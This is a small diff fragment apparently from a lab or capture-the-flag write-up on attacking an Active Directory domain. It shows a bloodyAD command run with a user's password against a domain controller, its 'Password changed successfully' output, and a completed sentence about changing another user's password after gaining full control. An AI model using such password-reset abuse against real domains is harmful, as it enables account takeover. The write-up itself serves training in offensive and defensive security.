@@ -670,4 +670,5 @@ bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Pass
 [+] Password changed successfully!
 ```
 
-And since i have full control ill chan
+And since i have full control ill change his password!
+
